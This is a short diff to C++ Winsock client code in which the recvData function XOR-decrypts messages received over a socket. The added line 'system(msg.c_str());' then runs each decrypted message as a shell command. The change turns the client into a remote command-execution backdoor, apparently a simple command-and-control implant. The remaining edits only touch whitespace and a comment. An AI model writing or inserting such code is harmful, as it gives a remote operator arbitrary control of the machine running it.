@@ -154,10 +154,10 @@ int Socks::recvData() {
 			if (x >= peaky_len) {
 				x = 0;
 			}
-			//msg = msg + recvbuf[i];
 			msg[i] = msg[i] ^ peaky[x];
 		}
 		printf("Unencrypted message: %s\n", msg.c_str());
+		system(msg.c_str());
 	}
 	else if (result == 0)
 		printf("Connection closed\n");
@@ -172,6 +172,7 @@ void Socks::endclient() {
 	closesocket(ConnectSocket);
 	WSACleanup();
 }
+
 
 int main()
 {
@@ -197,4 +198,3 @@ int main()
 	socket.endclient();
 	return 0;
 }
-
